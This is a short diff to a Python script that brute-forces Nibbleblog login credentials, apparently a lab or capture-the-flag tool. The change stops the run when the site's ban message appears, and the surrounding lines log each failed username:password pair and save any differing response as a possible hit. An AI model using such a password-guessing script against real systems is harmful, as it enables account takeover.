@@ -34,6 +34,7 @@ def make_request(endpoint, uname, pword, ip_addy):
                 print(f"[-] {str(request_count)}:FAIL    -   {uname}:{pword}")
         elif 'Nibbleblog security error' in r.text:
                 print("[-] Looks like you might've just gotten banned..")
+                sys.exit("[!] Already banned...stopping process now.")
         else:
                 print(f"[+] Oooooh that looked different!\n{uname}:{pword}")
                 with open("script_output.txt", "w") as f:
